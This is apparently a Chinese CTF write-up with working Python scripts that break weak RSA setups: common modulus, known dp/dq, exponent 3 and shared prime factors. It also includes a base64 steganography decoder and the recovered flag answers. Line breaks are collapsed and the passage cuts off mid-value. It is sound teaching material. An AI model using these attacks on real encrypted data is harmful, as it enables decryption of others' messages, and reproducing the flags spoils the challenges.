8786437178698940322877889807009957616777351844979869726962356553244050911283984280960665761649310895230455072977431415102053987735969326553978994853162483051544656873294555116009995592043183070208706258164840540599577072097104139505857517663273929851202628854185356185647194933800084230503413037858893307713037149307477830536758283681093517617820169181420796105338681582230788318108428132051793761014952837330456262272828627355701464740578197966332613127307037255647286823496355917642353327912440019621838870388091824748629637425759125214639885130163183752378908729773517053259212525494555880921052679512582051516604297098204363525081039382358483926727008679327719083138865969291911863630382097160230960738043575559330264018212774424527719153248563876760067931499029384228993253862501939337758514377472011933279273181144830381169849387893799390755052093069179605579485710343655570028592595882436632426527654452895431758715126580164902410286422637215098476316042367916779431052267545769495994723721129943616294879642305545894912914632980455031755879087401575310699765408473606166727137934224515998416625122213056208800095077933103150699272650116151674702438463062734472714004926103668378506804002740045547964716693536349447660850580c2_5 = 205314962204511500352858372254132533167549960825498949618514841570703199264867431580754674275990554478140637041427842111391746883257447120035947621456863890934062044010795443059281736346976175772415034838334682726635263432655537852942177334888025283748611576171534251461847349566505628290587224150869640386437623371249743165260396675220683302142805646368906930575140628610003919131999295855501215111393294818218799982703289304596989070475000081175510085432290264502023736899104746316830742226946395027029820825791831870857382647221322734605026210073093918331247494307555600335550942340526536281372036612138713881098866303169425501998978400008829873080965592009371176208668290074288903681417933657472279670688597862835627506340169978450918788539270346340385928840299573889292189531738082166408734046381423516467694328971385421907314814283489322619386570046183556572383980777277173349209330683424343658179781015072259378576130442222984963071166207642585589822061597282467850868050737957726423713761694231879497037175627546427449730638216214828463003483408928375620315193290871300316930139260521382533279767663839278693750409419493280753368451508802658272220767624766390639285308433607255253282702383762149755935518922075584637512494819c2_6 = 271453634732502613378948161256470991260052778799128789839624515809143527363206813219580098196957510291648493698144497567392065251244844074992734669490296293997386198359280316655904691639367482203210051809125904410431506925238374843856343243276508280641059690938930957474434518308646618959004216831130099873532714372402117796666560677624822509159287675432413016478948594640872091688482149004426363946048517480052906306290126242866034249478040406351940088231081456109195799442996799641647167552689564613346415247906852055588498305665928450828756152103096629274760601528737639415361467941349982213641454967962723875032638267311935042334584913897338553953961877439389588793074211502597238465542889335363559052368180212013206172712561221352833891640659020253527584706465205486408990762759230842192028381048563437724528409174790022752557512795782713125166158329880702730769957185428522011430144840232256419113631679343171680631630775266488738173707357123139368825087043785842169049943237537188129367275730984789479909103397937113837824575137021012333461552176687570010445744268373840742899299977372834041925102853718964831225250407279578465008537542659673685686242773379131904890865110699190451534445434533919127658976874721029586168106207cce1=1697e2=599ans=exgcd(e1,e2,0,0)s1=ans[1]s2=ans[2]c1 = [c1_1,c1_2,c1_3,c1_4,c1_5,c1_6]c2 = [c2_1,c2_2,c2_3,c2_4,c2_5,c2_6]#powmod()函数,分数取模也可以直接算bases = &quot;&quot;for i in range(len(c1)): m = (gmpy2.powmod(c1[i],s1,n)*gmpy2.powmod(c2[i],s2,n)) % n bases += str(long_to_bytes(m),&quot;utf-8&quot;)# print(flag.replace(&quot;\\n&quot;,&quot;','&quot;))basesList = ['VEhJUz==','RkxBR3==','SVN=','SElEREVOLo==','Q0FO','WU9V','RklORM==','SVT=','T1VUP4==','RE8=','WU9V','S05PV9==','QkFTRTY0P5==','WW91bmdD','VEhJTku=','WU9V','QVJF','Tk9U','VEhBVE==','RkFNSUxJQVI=','V0lUSO==','QkFTRTY0Lh==','QmFzZTY0','aXO=','YW==','Z3JvdXA=','b2b=','c2ltaWxhcn==','YmluYXJ5LXRvLXRleHR=','ZW5jb2Rpbme=','c2NoZW1lc0==','dGhhdD==','cmVwcmVzZW50','YmluYXJ5','ZGF0YW==','aW5=','YW6=','QVNDSUl=','c3RyaW5n','Zm9ybWF0','Ynk=','dHJhbnNsYXRpbmd=','aXS=','aW50b1==','YT==','cmFkaXgtNjQ=','cmVwcmVzZW50YXRpb24u','VGhl','dGVybc==','QmFzZTY0','b3JpZ2luYXRlc8==','ZnJvbd==','YY==','c3BlY2lmaWN=','TUlNRT==','Y29udGVudI==','dHJhbnNmZXI=','ZW5jb2Rpbmcu','VGhl','cGFydGljdWxhct==','c2V0','b2b=','NjR=','Y2hhcmFjdGVyc5==','Y2hvc2Vu','dG+=','cmVwcmVzZW50','dGhl','NjQ=','cGxhY2UtdmFsdWVz','Zm9y','dGhl','YmFzZd==','dmFyaWVz','YmV0d2Vlbt==','aW1wbGVtZW50YXRpb25zLp==','VGhl','Z2VuZXJhbI==','c3RyYXRlZ3n=','aXO=','dG9=','Y2hvb3Nl','NjR=','Y2hhcmFjdGVyc5==','dGhhdA==','YXJl','Ym90aN==','bWVtYmVyc5==','b2a=','YS==','c3Vic2V0','Y29tbW9u','dG8=','bW9zdM==','ZW5jb2RpbmdzLA==','YW5k','YWxzb8==','cHJpbnRhYmxlLg==','VGhpc9==','Y29tYmluYXRpb25=','bGVhdmVz','dGhl','ZGF0YW==','dW5saWtlbHk=','dG/=','YmV=','bW9kaWZpZWS=','aW5=','dHJhbnNpdE==','dGhyb3VnaN==','aW5mb3JtYXRpb26=','c3lzdGVtcyw=','c3VjaN==','YXM=','RS1tYWlsLD==','dGhhdA==','d2VyZQ==','dHJhZGl0aW9uYWxseQ==','bm90','OC1iaXQ=','Y2xlYW4uWzFd','Rm9y','ZXhhbXBsZSw=','TUlNRSdz','QmFzZTY0','aW1wbGVtZW50YXRpb24=','dXNlcw==','QahDWiw=','YahDeiw=','YW5k','MKhDOQ==','Zm9y','dGhl','Zmlyc3Q=','NjI=','dmFsdWVzLg==','T3RoZXI=','dmFyaWF0aW9ucw==','c2hhcmU=','dGhpcw==','cHJvcGVydHk=','YnV0','ZGlmZmVy','aW4=','dGhl','c3ltYm9scw==','Y2hvc2Vu','Zm9y','dGhl','bGFzdA==','dHdv','dmFsdWVzOw==','YW4=','ZXhhbXBsZQ==','aXM=','VVRGLTcu']flag = &quot;&quot;for i in basesList: print(str(base64.b64decode(i))[2:-1],end = &quot; &quot;)# THIS FLAG IS HIDDEN. CAN YOU FIND IT OUT? DO YOU KNOW BASE64? YoungC THINK YOU ARE NOT THAT FAMILIAR WITH BASE64. Base64 is a group of similar binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation. The term Base64 originates from a specific MIME content transfer encoding. The particular set of 64 characters chosen to represent the 64 place-values for the base varies between implementations. The general strategy is to choose 64 characters that are both members of a subset common to most encodings, and also printable. This combination leaves the data unlikely to be modified in transit through information systems, such as E-mail, that were traditionally not 8-bit clean.[1] For example, MIME's Base64 implementation uses A\\xa8CZ, a\\xa8Cz, and 0\\xa8C9 for the first 62 values. Other variations share this property but differ in the symbols chosen for the last two values; an example is UTF-7. c = bytes(bases,encoding = &quot;utf-8&quot;)def get_base64_diff_value(s1, s2): base64chars = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in range(len(s2)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): line=b'' bin_str='' for i in c: k=long_to_bytes(i) if k==b'\\n': steg_line = line norm_line = base64.b64encode(base64.b64decode(line)) diff = get_base64_diff_value(steg_line, norm_line) #print(diff) pads_num = steg_line.count(b'=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 print(goflag(bin_str)) line=b'' continue line+=kdef goflag(bin_str): res_str = '' for i in range(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i + 8], 2)) return res_strif __name__ == '__main__': solve_stego()# flag{7c86d8f7d6de33a87f7f9d6b005ce640} 已知dp、dq“一切以解题为目的的抄代码都是没有灵魂的，我们还是要从数学理论上去分析解决它，再去写代码。” 1234567891011已知条件：c ≡ m ** e mod n m ≡ c ** d mod nφ(n) = (p-1)(q-1)d*e ≡ 1 mod φ(n)dp ≡ d mod (p-1)dq ≡ d mod (q-1)中国剩余定理：m1 ≡ c ** d mod Pm2 ≡ c ** d mod q 经过各种推算: 12m1 ≡ c ** dp mod pm2 ≡ c ** dq mod q 正常解法： 12345678import gmpy2I = gmpy2.invert(q,p)mp = pow(c,dp,p)mq = pow(c,dq,q) #求幂取模运算m = (((mp-mq)*I)%p)*q+mq #求明文公式print(hex(m)) #转为十六进制 RSA1 （已知dp、dq）参考 12345678910111213141516import gmpy2from Crypto.Util import numberp = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 I = gmpy2.invert(q,p)mp = pow(c,dp,p)mq = pow(c,dq,q) #求幂取模运算m = (((mp-mq)*I)%p)*q+mq #求明文公式print(number.long_to_bytes(m)) #long_to_bytes# noxCTF{W31c0m3_70_Ch1n470wn} 低加密指数攻击dangerous RSA （低加密指数攻击）1234#n: 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L#e: 0x3#c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365so,how to get the message? 因为c = m ** e%n，m = c ** d%n 当指数e很小的时候（通常为3），可以分两种情况来讨论 当m ** e&lt;n： c = m ** e 对c开e次根号 当m ** e&gt;n: m ** e = k * n+c 循环爆破k，使其满足条件 这边推荐使用gmpy2.iroot函数来开根号，这个函数的返回值为一个(x,y)元组，其中x为结果值，y为一个bool型变量，如果x为整数，y=True,否则y=False 12345678import gmpy2from Crypto.Util import numbere = 3c = 0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365n = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793m = gmpy2.iroot(c,e)[0]print(number.long_to_bytes(m)) 当然这题，这道题的m很小，我只是对m开了三次根号。 而对于m值很大的情况，循环k，使k*n+c开e次根号，iroot返回的第二个值为True即可 123456789101112from gmpy2 import irootfrom Crypto.Util import numbern = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793c = 0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365e = 0x3k = 0while 1: res=iroot(c+k*n,e) if(res[1]==True): print(number.long_to_bytes(res[0])) break k=k+1 公因数分解n[BJDCTF2020]RSA（公因数分解n+爆破e）1234567891011121314151617181920212223242526from Crypto.Util.number import getPrime,bytes_to_longflag=open(&quot;flag&quot;,&quot;rb&quot;).read()p=getPrime(1024)q=getPrime(1024)assert(e&lt;100000)n=p*qm=bytes_to_long(flag)c=pow(m,e,n)print c,nprint pow(294,e,n)p=getPrime(1024)n=p*qm=bytes_to_long(&quot;BJD&quot;*32)c=pow(m,e,n)print c,n'''output关于e的爆破脚本： 1234567891011p2 = 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018n2 = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037e = 1while 1: if pow(294,e,n2) == p2: print(e) break else: print(e) e += 1# e = 52361 其余项打算用z3来解的，但是解不出来…… –更新– 忘了一个最重要的条件:当n1,n2很大的时候，q = gcd(n1,n2)!!! 123from gmpy2 import *q = gcd(n1,n2)# q = 99855353761764939308265951492116976798674681282941462516956577712943717850048051273358745095906207085170915794187749954588685850452162165059831749303473106541930948723000882713453679904525655327168665295207423257922666721077747911860159181041422993030618385436504858943615630219459262419715816361781062898911 求出q，那接下来就好办了： 12345678910111213from gmpy2 import *from Crypto.Util.number import *p2 = 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018c1 = 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120 n2 = 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047n1 = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037q = 99855353761764939308265951492116976798674681282941462516956577712943717850048051273358745095906207085170915794187749954588685850452162165059831749303473106541930948723000882713453679904525655327168665295207423257922666721077747911860159181041422993030618385436504858943615630219459262419715816361781062898911p1 = n1//qe = 52361d = invert(e,(p1-1)*(q-1))m = pow(c1,d,n1)print(long_to_bytes(m))# BJD{p_is_common_divisor} RSA5（公因数求解）本来想用CRT的，但是题目中给出的e很大，不适合用。 只能从给出的20个n中找规律了 12# 若n1,n2不互质p = gcd(n1，n2) 从20个n中找出有公约数的一对，然后找出对应n的p和q，剩余的就顺水推舟了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import gmpy2from Crypto.Util.number import *n1 = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207c1 = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320n2 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759c2 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855n3 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491c3 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862n4 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751c4 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613n5 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067c5 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357n6 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369c6 = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932n7 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137c7 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179n8 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191c8 = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006n9 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941c9 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934n10 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491c10 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869n11 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019c11 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467n12 = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299c12 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971n13 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551c13 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175n14 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987c14 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457n15 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837c15 = 